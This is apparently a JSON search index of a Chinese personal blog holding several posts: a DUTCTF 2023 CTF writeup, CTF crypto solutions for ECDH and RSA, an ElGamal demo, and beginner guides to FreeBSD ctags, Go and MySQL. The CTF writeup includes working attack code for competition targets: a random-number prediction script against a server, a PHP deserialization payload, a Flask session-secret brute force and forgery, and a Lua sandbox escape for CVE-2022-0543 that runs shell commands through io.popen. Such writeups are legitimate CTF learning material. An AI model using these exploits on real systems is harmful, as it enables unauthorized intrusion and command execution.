[{"title":"Advanced_RSA","url":"/2023/03/23/Advanced-RSA/","content":"RSA进阶Tools\n分解大质数\n\nFactordb （http://www.factordb.com）\n\nyafu （适用于p，q相差过大或过小的情况）\n\n\n\n\n​                https://sourceforge.net/projects/yafu/\n​                下载后在命令行中执行.\\yafu-x64.exe “factor(6)”或.\\yafu-x64.exe “factor(@)” -batchfile data.txt即可\n​    \n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]},{"title":"[DUTCTF 2023] Writeup by Z3ds1ch","url":"/2023/03/28/DUTCTF_wp/","content":"\n\n[DUTCTF 2023] Writeup by Z3ds1ch小摸了个Second，可惜没有AK WEB，好好学习下次加油，&gt;_&lt;\nMisc*签到题做题记录被删了qwq\n直接b站视频一个个翻评论就能找到flag\n*Minecraftwurstclient直接xray+flight+fullbright，配合饼图找非自然方块找到箱子，从书与笔中获得flag\n我在哪?🥵\n在右上角可以发现十八中和CIC，又已知这是江边，搜索这些关键词就能找到答案曾家岩，md5加密即可\n（某个网站md5加密坏了好几年了一直不修，我不说是谁，还得用cyberchef）\n不要更新！\n在流量包里搜索字符串flag，可以找到一个Github的Repository，找到这个仓库（https://github.com/IShiraiKurokoI/Flag），仓库里有1.0.0的Release版本，根据题目描述不要更新可以联想到需要找到之前的版本/日志，直接使用Github自带的compare功能就能找到flag，一眼凯撒，直接转就行\n\nez_img解压之后只有一张图片2.png\n\n先拖进010editor中扫一眼\n\n显然最后一个IDAT块有些问题，但提取有些困难，暂且按下不表，先看看有没有简单的，Ctrl+F搜索字符串flag，找到了flag头，直接Base64 Decode即可\n\n再尝试一下是不是藏东西了，直接foremost拆出来4.png和QRcode\n\n\n4.png的flag中间一段直接送了，显然QRcode是最后一段了，直接脚本转成二维码就行\nfrom PIL import Imagefrom gmpy2 import *import sysfrom zlib import *sys.set_int_max_str_digits(0)MAX = 500pic = Image.new(\"RGB\",(MAX,MAX))with open \"QRcode\" as f:    str=f.readline()str=bin(int(str))print(iroot(len(str),2))i=0for y in range(0,MAX):    for x in range(0,MAX):        if(str[i] == '1'):            pic.putpixel([x,y],(0,0,0))        else:pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(\"flag.png\")# DUTCTF{3E07747C-E552-EC96-003C-F3DBD9CD6704}\n看雪❄自从那个冬夜看雪，一晃已是二十年，当年的脚本小子们都在哪个irc频道聊天呢？flag格式为DUTCTF{ip:port#频道名}\n看到题目描述能判断出是要社工出看雪论坛的irc频道，先去bbs.kanxue.com找一下线索\n\n尝试了一下果然不对，使用方法给的连接也无效了，联想到之前有一篇讲看雪创始的新闻https://zhuanlan.zhihu.com/p/23831052，标题是自从那个冬夜看雪，一晃已是十六年，所以可能是要找2003年左右的irc频道，再继续往下翻论坛的评论区可以证实我们的猜想\n\n坛主说在三四年前（2002/2003）确实有过irc频道，但我们在现在的论坛里找不到当时的记录了，可能是时间过久被删除或是因为其他原因不见了，在https://www.pediy.com/kssd/pediy05/pediy50326.htm里可以找到一些之前的帖子，但很多帖子还是失效了，找了很久还是无果，所以只能尝试用网页快照来恢复。但很可惜百度快照、Google快照等等功能都被关闭了，国内的忆往昔保存的网页历史快照最早只有2022年，在一番搜索下找到了WayBackMachine:archive.org，搜索之前发现的失效的地址www.pediy.com/irc.htm可以找到当时的记录\n\n随便点开一篇最开头就能找到答案了\n\n\nREVERSE*贪吃蛇拖进ida里直接Shift+F12就能找到flag了\nGAME!下棋就行（为了帮忙测试新附件对不对又重下了一遍）\n\n\nezdraw拖进ida里按空格会报错The graph is too large to be displayed，搜索解决方案后再按空格就能看到flag了\n\n\nCRYPTO上次AK了CRYPTO，现在正在转WEB的途中，难题都没出，只能说老本行手生了\n*老滚五直接龙语翻译即可\n*神奇的短信因为题目信息是诺基亚，题目描述里又说是全大写字母，可以联想到是键盘输入字母\n其实是猜的，五位全字母显然是队名啊qwq\nshamir​        shamir基本原理\n​        假设我们存在一个秘密S，把秘密S进行特定运算，得到w个秘密碎片，交给w个人保存，当至少t个人同时拿出自己所拥有的秘密碎片时，即可还原出最初的秘密S。\n​        秘密碎片生成：\n​        我们先构造一个多项式：，其中，s是我们的秘密，p是一个素数，而且满足，取w个不相等的x，代入中，得到w组，分配给w个人，公开p，销毁多项式，每个人负责保密自己的\n​        秘密恢复\n​        当时，，即可恢复s，将i组带入下面这个式子即可，\nEXPimport Crypto.Util.number as numbimport randomdef oj(a, n):    a = a % n    s = [0, 1]    while a != 1:        if a == 0:            return 0        q = n // a        t = n % a        n = a        a = t        s += [s[-2] - q * s[-1]]    return s[-1]def create(max_length=513, secret_is_text=0, p=0):    if not p:        p = numb.getPrime(max_length)    w = int(input(\"请输入秘密保存人数：\"))    t = int(input(\"请输入秘密恢复所需人数：\"))    while not (t &gt; 0 and t &lt;= w):        t = int(input(\"请重新输入：\"))    s = input(\"请输入你的秘密:\")    if secret_is_text:        s = numb.bytes_to_long(s.encode(\"utf-8\"))    else:        try:            s = int(s)        except Exception as e:            s = numb.bytes_to_long(s.encode(\"utf-8\"))    x_list = list()    a_list = list()    i = w    while i &gt; 0:        x = random.randint(p // 2, p)        if x not in x_list:            x_list.append(x)            i -= 1    for a in range(t):        a_list.append(random.randint(p // 2, p))    result = list()    for x in x_list:        y = s        for a_n in range(t):            a = a_list[i]            y += a * pow(x, i + 1, p)        result.append((x, y))    return t, p, resultdef restore(p, information, get_text=1):    x_list = list()    y_list=list()    for x, y in information:        x_list.append(x)        y_list.append(y)    s = 0    for x_i in range(len(x_list)):        tmp_num = y_list[x_i]        x_i_j = 1        for x_j in range(len(x_list)):            if x_i != x_j:                tmp_num = tmp_num * (0 - x_list[x_j]) % p                x_i_j *= x_list[x_i] - x_list[x_j]        tmp_num = tmp_num * oj(x_i_j, p) % p        s += tmp_num    s = s % p    print(s)    if get_text:        try:            s = numb.long_to_bytes(s)            s = s.decode(\"utf-8\")        except Exception as e:            print(e)    return st, p, result = create() print(result)print(restore(p, result[:t])) \n随机数的力量看题目发现和去年SSSCTF 2022一样，所以猜测还是和预测随机数有关，先看一下task.py，唯一有用的是下面这一段\ndef handle(self):    self.send(b'welcome to this guess game!')    self.send(b'please tell me your name:', newline=False)    name = self.recv()    if bytes_to_long(name).bit_length() &lt;= 32:        self.send(b'flag')        exit()    self.send(b'Let\\'s guess!')    while True:        guess = random.randint(0, bytes_to_long(name))        self.send(b'&gt;', newline=False)        if int(self.recv().decode()) == guess:            self.send(flag)        else:            self.send(b'sorry, but the num is:', newline=False)            self.send(str(guess).encode())\n我们需要发送一个name，且满足bytes_to_long(name).nbit_length()&gt;32，随后服务端会调用randint()函数，从0到bytes_to_long(name)中随机生成一个数让我们进行猜测\n首先我们需要知道，Python中的random模块是可以人为破解的，其底层是使用梅森旋转算法来生成伪随机数序列，可以先去了解一下：https://blog.csdn.net/tianshan2010/article/details/83247000，由于生成算法已知，所以可以人为预测，可以采用的python库有Python-random-module-cracker和mersenne-twister-predictor，虽然前者可以直接预测randint()，但只能预测(0,4294967294)这个范围内的数，所以要用后者，但官方提供的只有getrandbits()。我们查看一下getrandbits()的源码，可以发现一条利用链：实际上randint(a,b)函数返回值的生成过程，是调用randrange(a,b+1)函数。而randrange(a,b+1)函数是先获取宽度width=b+1-a，然后当宽度大于最大宽度时，调用a+_randbelow(width)函数。而_randbelow(width)函数，首先计算k = _int(1.00001 + _log(n-1, 2.0))，相当于计算width转化成二进制位有多少位，然后在调用getrandbits(k)。由于预测32位的随机数需要传624个参数，简单推导一下就可以知道传312个参数就可以预测64位的随机数\nEXPimport randomfrom mt19937predictor import MT19937Predictorpredictor = MT19937Predictor()name_num=2**64-2name=long_to_bytes(name_num)io=remote(\"210.30.97.133\",28044)io.recvuntil(b'please tell me your name:')io.sendline(name)for i in range (312):    print(\"Times: \",i)    io.recvuntil(b'&gt;')    io.sendline(b'1')    io.recvuntil(b'sorry, but the num is:')    num = io.recvline()    num = int(num)    # print(num)    predictor.setrandbits(num,64)io.recvuntil(b'&gt;')predict_num=bytes(str(predictor.getrandbits(64)).encode())# print(predict_num)io.sendline(predict_num)print(io.recvline())\n\nPWN*中间人简单的滚动码开车门，intercept之后发送下一次的信号就能开门了\n\nWEB非常的可惜没有AK，转WEB没多久，sql还没怎么学，果然还是不能急于求成\nembryo_webBurpSuite抓个包看注释就有flag了\n*Trenja直接玩两个小游戏就能出flag，但还是比较推荐翻js的源码\nbabyphp简单的php反序列化，随手构造个链子就行：User-&gt;__destruct()-&gt;Info-&gt;update()-&gt;win()\nPOC$a='O:4:\"User\":3:{s:4:\"name\";s:5:\"admin\";s:6:\"passwd\";N;s:4:\"info\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";s:5:\"admin\";s:8:\"birthday\";N;}}';\nfake_session先上题\nfrom flask import Flask, sessionimport randomimport my_secretapp = Flask(__name__)app.config['SECRET_KEY'] = my_secret.my_secret()@app.route('/')def hello_world():    if not session.get('user'):        session['user'] = ''.join(random.choices(\"23333\", k=5))    return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin():    if session.get('user') != \"admin\":        return \"you are not admin!go away\"    else:        flag = ''        with open('/flag', 'r') as f:            for line in f:                flag += line        return 'Congratulations! You logged in as admin. Here is the flag:{}'.format(flag)if __name__ == '__main__':    app.run(host='0.0.0.0', port=8080)\n显然是伪造session的题，cookie里用flask_unsign直接伪造就行，我们没有secret，但提示了是弱口令，自己写个字典爆破一下就能出\nimport stringimport flask_unsigntable = string.ascii_letters + string.digits# s = string.digits# s=[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\"]index=[]for s1 in table:    for s2 in table:        for s3 in table:                s=s1+s2+s3                index.append(s)l=len(index)with open (\"index.txt\",mode=\"w\") as f:    for i in range (l):        if (i%10000==0):            print(\"times:\",i)        f.write(\"\\\"\")        f.write(index[i])        f.write(\"\\\"\\n\")\n爆破一下secret\nPS C:\\&gt; flask-unsign --unsign --cookie 'eyJ1c2VyIjoiMzMyMjMifQ.ZCBOug.JAGEY2qy_y_fzPhWoQWYw95jSf4' --wordlist \"index.txt\"[*] Session decodes to: {'user': '33223'}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 216448 attempts'4rc'\n然后伪造一下数字签名，用cookie edior改一下cookie就可以了\ncve去年[虎符CTF 2022] Quest-RCE原题，利用了CVE-2022-0543来进行沙盒逃逸\nlocal io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\");local io = io_l();local f = io.popen(\"id\", \"r\");local res = f:read(\"*a\");f:close();return res---在\"id\"进行这里恶意代码注入\n读一下源码发现有base64.StdEncoding.DecodeString(custom)，所以payload要进行一次Base64加密\nPOST doCustom路由，对custom传参payload就行\n","categories":["CTF"],"tags":["CTF","CRYPTO","DUTCTF 2023","MISC","PWN","WEB"]},{"title":"ECDH-密码交换攻击","url":"/2023/03/11/ECDH/","content":"[NewStarCTF] Week 5 - An der schönen Elliptische KurveAnalyz先上题：\n#task.sagefrom secret import FLAG, ECDH_KEY_EXCHANGEfrom Crypto.Cipher import AESfrom hashlib import md5from os import urandomiv = urandom(16)a = 14489b = 10289p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661F = GF(p)E = EllipticCurve(F, [a, b])G = E.random_point()my_private_key = random_prime(2^256)shared, sender_public_key = ECDH_KEY_EXCHANGE(G, my_private_key)key = md5(str(int(shared.xy()[0])).encode()).digest()cipher = AES.new(key, AES.MODE_CBC, iv)ciphretext = cipher.encrypt(FLAG)print(a)print(b)print(p)print(sender_public_key)print(my_private_key)print(ciphretext.hex())print(iv.hex())\n#output.txt14489102897486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)25495456812197660236899774619860149159465038062538775349151750933063178527732f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23d151c04c645c3e2a8d3f1ae44589ef20\n浅分析一下task.sage，我们只有sender_public_key和my_private_key，显然考察的是ECDH\n\nECDH算法假设有两端，Alice和Bob，他们想在非安全信道上安全地交换信息但又不想被第三方获取，此时可以采用ECDH密钥交换算法\n双方都知道ECDH算法中的一个大素数p，还有一个整数g作为辅助\nAlice生成私钥a，并通过生成公钥。Bob生成私钥b，然后通过生成公钥B，在发送B之前，Bob通过生成公共密钥，但是只发送B，而Alice在接收到Bob的公钥B之后，同样可以通过来生成公共密钥K。\n\n攻击对于Alice和Bob来说，\n所以我们可以得出以下结论，\nEXP#Sagefrom hashlib import *from Crypto.Cipher import AESfrom Crypto.Util.number import *a=14489b=10289p=7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661#sender_public_key=(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)my_private_key=2549545681219766023689977461986014915946503806253877534915175093306317852773ciphertext=\"2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23\"iv=\"d151c04c645c3e2a8d3f1ae44589ef20\"F=GF(p)E=EllipticCurve(F,[a,b])sender_public_key=E([1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207,1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459])shared=sender_public_key*my_private_keykey = md5(str(int(shared.xy()[0])).encode()).digest()#iv=int(iv,16)iv=bytes.fromhex(iv)#ciphertext=int(ciphertext,16)ciphertext=bytes.fromhex(ciphertext)cipher=AES.new(key,AES.MODE_CBC,iv)cipher=cipher.decrypt(ciphertext)print(cipher)\n","categories":["CTF"],"tags":["CTF","CRYPTO","ECC","ECDH"]},{"title":"同态加密 ElGamal方案","url":"/2023/05/05/ElGamal/","content":"同态加密 ElGamal方案原理ElGamal方案\ngenerate_keys(p,g)\n\n\n\\begin{align}\n&x\\in[1,p-1]\\\\\n&y=g^x\\ (mod\\ p)\\\\\n&\\rightarrow x,y\\\\\n\\end{align}\nencrypt(m,p,g,y)\n\n\\begin{align}\n&k\\in[1,p-1]\\\\\n&a=g^k\\ (mod\\ p)\\\\\n&b=(y^k\\ (mod\\ p))*m\\ (mod\\ p)\\\\\n&\\rightarrow a,b\\\\\n\\end{align}\ndecrypt(c,x,p)\n\n\\begin{align}\n&c=(a,b)\\\\\n&m=(a^{p-1-x}\\ (mod\\ p)*b)\\ (mod\\ p)\\\\\n&\\rightarrow m\\\\\n\\end{align}\n同态加密过程\n\n生成一个大素数和生成元\n用generate_keys(p,g)生成公钥和私钥\n将字节串明文转换为大整数\n用encrypt(m,p,g,y)进行加密\n\n\n同态解密过程\n用decrypt(c,x,p)进行解密\n\n\n\n乘法同态\nhomomorphic_addition(c1, c2, p)\n\n\n\\begin{align}\n&c_1=(a_1,b_1)\\\\\n&c_2=(a_2,b_2)\\\\\n&c = (a_1a_2,b_1b_2)\\ (mod\\ p)\\\\\n&\\rightarrow c\n\\end{align}\n加密过程\n选择明文\n用encrypt(m, p, g, y)分别对进行加密，得到\n用homomorphic_addition(c1, c2, p)计算得到密文\n\n\n解密过程\n用decrypt(c3, x, p)进行解密\n\n\n\nEXPimport randomfrom Crypto.Util.number import *from hashlib import sha256def generate_keys(p, g):    \"\"\"生成公钥和私钥\"\"\"    x = random.randint(1, p-1)    y = pow(g, x, p)    return (x, y)def encrypt(m, p, g, y):    \"\"\"加密明文m\"\"\"    k = random.randint(1, p-1)    a = pow(g, k, p)    b = (pow(y, k, p) * m) % p    return (a, b)def decrypt(c, x, p):    \"\"\"解密密文c\"\"\"    a, b = c    m = (b * pow(a, p-1-x, p)) % p    return m# 选择大素数p和生成元gp = getPrime(215)g = 3# 生成公钥和私钥x, y = generate_keys(p, g)# 要加密的明文pt = b'flag{f1rst_attempt}'m = bytes_to_long(pt)# 加密明文c = encrypt(m, p, g, y)# 解密密文m_decrypted = decrypt(c, x, p)plain_text=long_to_bytes(m_decrypted)print(\"原始消息：\", pt, m)print(\"加密后的消息：\", c)print(\"解密后的消息：\", m_decrypted, plain_text)def homomorphic_addition(c1, c2, p):    \"\"\"密文的乘法同态\"\"\"    a1, b1 = c1    a2, b2 = c2    c = ((a1 * a2) % p, (b1 * b2) % p)    return c# 选择两个明文m1和m2m1 = 12345m2 = 67890# 分别加密明文m1和m2c1 = encrypt(m1, p, g, y)c2 = encrypt(m2, p, g, y)# 对密文进行加法同态c3 = homomorphic_addition(c1, c2, p)# 解密得到加法结果m3 = decrypt(c3, x, p)print(\"加密前的明文：\", m1, m2, m1*m2)print(\"加密后的密文：\", c1, c2)print(\"同态加密后的密文：\", c3)print(\"解密后的明文：\", m3)\nOutput\n原始消息： b'flag{f1rst_attempt}' 2284117282071553800931956111894576012213646461加密后的消息： (34326925946024248202348149516524597794238307293963587312465083699, 29257544864745339573358716821088326225971289538713175924341045784)解密后的消息： 2284117282071553800931956111894576012213646461 b'flag{f1rst_attempt}'加密前的明文： 12345 67890 838102050加密后的密文： (37592138195462689660118434358852570152863680935153357241889524484, 1881167267842650302000965248563504534698498707009490637556715361) (10920357203713901658735049057071888229387493718439911523237682598, 19754766075170064385339139856259981647190642647308101159400975124)同态加密后的密文： (25162036149156949807143289802167075308069263753806093110671488815, 28248364394465727513102472477303058997839331903759424249041835410)解密后的明文： 838102050\n不过，有一种简单的技巧可以实现基本的加法同态，它被称为“乘法同态转化”。具体方法是，对于明文和，我们可以选择两个随机数和，然后计算和，然后对密文和进行乘法同态运算，得到密文，然后解密得到的明文就是。因此，我们可以通过减去和来获得的值，从而实现加法同态。\n","categories":["Study"],"tags":["Study","ElGamal","Homomorphic encryption"]},{"title":"FreeBSD-ctags","url":"/2023/11/15/FreeBSD-ctags/","content":"FreeBSD ctags configurationEnv\nFreeBSD 14.0-RC1\nVim - Vi IMproved 9.0\n\nWhat is ctagsctags（Generate tag files for source code）是vim下方便代码阅读的工具。尽管ctags也可以支持其它编辑器，但是它正式支持的只有Vim。并且Vim 中已经默认安装了ctags，它可以帮助程序员很容易地浏览源代码。\nConfiguration首先，我们需要安装ctags\n$ sudo pkg install ctags\n安装完成后可以查看安装的位置\n$ whereis ctags\n在安装完ctags后，我们需要生成对应的tags文件，才能在vim检索时进行跳转。我们切换到项目目录，并生成tags文件\n$ cd exp$ exctags -R .$ ls\n\n可以看到，我们现在已经生成了tags文件，我们还需要对我们的vim进行配置\n$ cd ~$ vim .vimrc\n我们在home目录下对.vimrc进行修改，添加以下两行：\nset tags=tags;set autochdir\n现在回到我们的项目目录，使用vim打开我们的文件，将光标挪动至想要跳转的位置，使用ctrl + ]便可以成功跳转了，想要返回只需使用ctrl + o\n\n\n","categories":["Study"],"tags":["FreeBSD","vim","ctags","Advanced C langhuage"]},{"title":"Go lang phase 1","url":"/2023/10/07/Go%20First/","content":"Go FirstEnv\ngo 1.21.2 Stable Version\nGoland 2023.2.2\n\nHello Worldpackage mainimport \"fmt\"func main() {    fmt.Println(\"Hello World\")}\npackage main ：Go感觉上和Java有点像，都需要声明该源文件属于哪个包，package main代表其是一个可以独立执行的程序，同样和Java一样，每个Go应用程序都需要有一个main包\nimport \"fmt\"：告诉ide这个程序需要用fmt这个包，而fmt中实现了格式化IO函数\nfunc main()：除init()外启动后第一个执行的函数\nfmt.Println()：格式化输出，会在字符串后自动增加\\n\n对于一个标识符，如果其以大写字母开头，则可以被包外引用，类似于public；而如果以小写字母开头，则只能在包内使用，类似于protected\n在Go中，{ 是不能单独放在一行里的，意味着在上方的helloworld.go中，只能写作func main() {而不能分在两行\nRun GoGo的源文件后缀为.go，在使用cli而非Goland等工具编写时，可以使用run和build指令\n// RunPS &gt; go run .\\helloworld.goHello world//BuildPS &gt; go build .\\helloworld.goPS &gt; ./helloworld.exeHello world\nBasic SyntaxLine separator在Go中，每一行代表着一条语句的结束，而不需要使用;，但如果要在一行内执行多条语句，则需要使用;将他们分隔开\nExegesis// Single-line exegesis/*\tMulti-line\texegesis*/\nIdentifier在Go中，标识符的命名和大多数语言一样，可以由大小写字母、数字、下划线共同构成，同样，必须以字母或下划线开头，而非使用数字\nStringsConcatenation在Go中，字符串拼接非常简单，只需要使用+即可\npackage mainimport \"fmt\"func main() {\tfmt.Println(\"Hello\" + \"world\")}// helloworld\nFormation在Go中，可以使用fmt.Sprintf和fmt.Printf来格式化字符串\n\nfunc Sprintf(format string, a ...any) string：格式化字符串并赋值给新串\n\n根据格式化参数生成格式化的字符串并返回该字符串，格式化样式中，格式化符号以%开头，%s为字符串，%d为十进制整数；参数列表中，各个参数之间以,隔开，其个数必须与前面的格式化样式对应\n// Example 1func main() {    var str1 = \"abc\"    var str2 = \"zyx\"    var template = \"str1 is %s and str2 = %s\"    var output = fmt.Sprintf(template, str1, str2)    fmt.Println(output)}// str1 is abc and str2 = zyx// Example 2func main() {\tvar num1 = 123\tvar num2 = 987\tvar template = \"num1 is %d and num2 is %d\"\tvar output = fmt.Sprintf(template, num1, num2)\tfmt.Println(output)}// num1 is 123 and num2 is 987\n常用的格式化符号\n\n\n\n\n%v\n按值的本来值输出\n\n\n\n\n%+v\n在 %v 基础上，对结构体字段名和值进行展开\n\n\n%#v\n输出 Go 语言语法格式的值\n\n\n%T\n输出 Go 语言语法格式的类型和值\n\n\n%%\n输出 % 本体\n\n\n%b\n整型以二进制方式显示\n\n\n%o\n整型以八进制方式显示\n\n\n%d\n整型以十进制方式显示\n\n\n%x\n整型以十六进制方式显示\n\n\n%X\n整型以十六进制、字母大写方式显示\n\n\n%U\nUnicode 字符\n\n\n%f\n浮点数\n\n\n%p\n指针，十六进制方式显示\n\n\n\n\n\nfunc Printf(format string, a ...any) (n int, err error)：格式化字符串并写入标准输出\n\n大体上和Sprintf类似，但不是赋值而是直接输出\nVariable声明变量一般使用var，格式为var name1, name2, ... type，如果定义一个变量但没有初始化，则会默认为零值，在Go中，变量也会自动判断类型，比如var name = value，会将name认为成和value一样的类型，\n:=：在Go中可以使用该符号来快速定义一个变量，name := 1等价于var name int; name = 1，所以我们不能对一个已经声明过的变量使用:=\n_在Go中，_是空白标识符，作用是用来抛弃某个值，其存在的意义与Go对变量的要求有关\nGo要求所有局部变量必须被使用（全局变量不需要，赋值不算做使用），而如果一个函数的返回值有多个，但我们不想全部使用，则可以如下操作：\nfunc main() {    // 只需要第二个返回值    _, num, _ = gen()    fmt.Println(num)}func gen() (int, int, int) {    a, b, c := 1, 2, 3    return a, b, c}// 2\n而与此同时，由于Go中相同类型的变量可以使用a, b = b, a进行快速的数值互换，所以在_, b = b, a中，b原先的值就被抛弃了\nConstant常量实在程序运行时不会被修改的量，定义如下\nconst name [type] = value\n这里的type可以省略，让其自行判断类型\nconst (\ta = \"hah\"    b = len(a)    c = unsafe.Sizeof(a))\n使用常量进行枚举时，函数必须得是内置函数，比如len()，unsafe.Sizeof()等等\niotaiota是Go中一个特殊的常量，其可以被编译器进行修改。iota在const出现时会被重置为0，而在之后每新增一项声明就会使iota += 1\nconst (\ta = iota    b = iota)// a = 0, b = 1\n","categories":["Go"],"tags":["WEB","Go"]},{"title":"初见MySQL——基础篇","url":"/2023/03/09/MySQL_1/","content":"初见MySQL——基础篇1.安装MySQL（zip archive）windows环境下不推荐用安装包安装，之后清理注册表比较麻烦\nzip archive website:https://dev.mysql.com/downloads/mysql/\n解压之后在文件夹里新建一个my.ini作为配置文件（新版本不自带这个）\n#my.ini[mysql]# 设置mysql客户端默认字符集default-character-set=utf8mb4[mysqld]#设置3306端口port = 3306# 设置mysql的安装目录basedir=D:\\mysql\\mysql-8.0.32-winx64# 设置mysql数据库的数据的存放目录datadir=D:\\mysql\\data # 允许最大连接数max_connections=200# 服务端使用的字符集默认为UTF8character-set-server=utf8mb4# utf8bm4即utf-8# 创建新表时将使用的默认存储引擎\n其中basedir和datadir需要根据解压目录和数据存放地址进行修改，建议在mysql-8.0.32-winx64同级新建一个data文件夹用于存放数据\n以管理员身份运行cmd命令，并切换到安装目录下的bin下\n初始化MySQL：\nmysqld --initialize --console#Expected output:#2023-03-06T04:35:17.961027Z 0 [System] [MY-013169] [Server] D:\\mysql\\mysql-8.0.32-winx64\\bin\\mysqld.exe (mysqld 8.0.32) #initializing of server in progress as process 23832#2023-03-06T04:35:17.979526Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.#2023-03-06T04:35:18.172968Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.#2023-03-06T04:35:18.707708Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: ************#Possible errors:#如果执行后报错：无法启动此程序，因为计算机中丢失VCRUNTIME140_1.dll，尝试重新安装此程序以解决此问题#Tips:#*号处是初始密码，需要保存下来\n安装MySQL：\nmysqld --install#Expected output:#Service successfully installed.\n登录数据库：\nmysql -u root -p#Expected output:#Enter password: ************#Welcome to the MySQL monitor.  Commands end with ; or \\g.#Your MySQL connection id is 9#Server version: 8.0.32#Possible errors:#ERROR 2003 (HY000): Can&#x27;t connect to MySQL server on &#x27;localhost:3306&#x27; (10061)#MySQL服务未开启#win+r,输入&quot;services.msc&quot;#找到&quot;MYSQL&quot;,右键选择&quot;属性&quot;,将&quot;启动类型&quot;改为&quot;自动&quot;,点击&quot;服务状态&quot;中的&quot;启动&quot;即可#ERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)#密码输错了，记得是初始密码\n修改初始密码：\nALTER USER root@localhost IDENTIFIED BY &#x27;********&#x27;;#Expected output:#Query OK, 0 rows affected (0.02 sec)\n2.MySQL基础操作2.1 查看数据库SQL是一种语言\nSQL是一种语言\nSQL是一种语言\n一定不能忘记加分号，分号说明这条语句结束，每个单词之间记得空格，这里展示所有的数据库，base后面记得加s，ctrl + c可以终止当前输入，mysql中不区分大小写，如果出现以下情况，说明语句未结束，可能是漏了分号\nmysql&gt; show database    -&gt; \n#Expected output:mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n\n2.2 建立数据库create database test1;\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| test1              |#+--------------------+#5 rows in set (0.00 sec)\n\n2.3 数据库语句分类2.3.1 DQL（数据查询语言）数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。\n#我们在看到select…这样的sql语句，都是数据查询语句，凡是带有select关键字的SQL语句都是DQL语句\n2.3.2 DML（数据操纵语言）  数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。\n#凡是带有INSERT、UPDATE、DELETE关键字的语句都是DML#insert —— 插入，等同于增#update —— 更新，等同修改#delete —— 删除\n​    这个主要操作的是表中的数据\n2.3.3 DDL（数据定义语言）  数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由creat、alter 与 drop 三个语法所组成. DDL 主要操作的是 表的结构 不是表中的数据\n#凡是带有 create（增）、alter（改）、drop（删）关键字的语句都是DDL#create —— 新建、等同于增#drop —— 删除#alter —— 修改\n​    这个增删改与 DML 有所不同，这个主要是对表结构进行操作.\n2.3.4 DCL（数据控制语言）  数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。对数据的权限进行控制的语言.\n#请求授权—— grant#撤销授权 —— revoke\n2.3.5 TCL（事务处理语言）  这里的TCL可不是王牌电视，事务处理语言(Transaction Control Language),它的语句能确保被DML语句影响的表的所有行及时得以更新。是一种事务控制语言。\n#事务提交 —— commit#事务回滚 —— rollback\n\n2.4 数据库的分类2.4.1 关系型数据库Mysql、Sql server、Oracle 、SqLite属于关系型数据库\n把数据按照 表 的形式来进行组织（类似于Excel这种形式的），关系型数据库能够对数据进行更严格的校验，带来更好的数据的完整性\n2.4.2 非关系型数据库Redis、HBase 、MongoDB属于非关系型数据库\n把数据按照 文档 的形式来进行组织，文档和文档之间的差别可以较大，更灵活的组织数据，效率更高，更容易在分布式环境下使用\n\n2.5 什么是表表是组织数据的一种形式，类似于Excel中的表格\n数据库中是以 表格的形式来表示数据的，因为表格比较直观，任何表都有行和列\n行（row）: 被称为数据/ 记录\n列（column）: 被称为字段\n每个字段都有字段名、数据类型、约束条件等属性\n字段名：只是一个普通的名字，见名知意就行了\n数据类型： 字符串类型，数字、日期等类型，在后面我们会详细介绍\n约束：约束也有很多，其中有一个叫做唯一性约束，这种约束添加后，该字段的数据不能重复\n2.5.1 查看数据库中的表use test1;\n#Expected output:#Database changed\nshow tables;\n#Expected output:#+--------------------+#| Database in test1  |#+--------------------+#| article            |#| res                |#| name               |#+--------------------+#3 rows in set (0.00 sec)\n\n2.6 数据库操作2.6.1 显示当前的数据库show databases;\n#Expected output:#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n2.6.2 创建数据库create database [name];\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           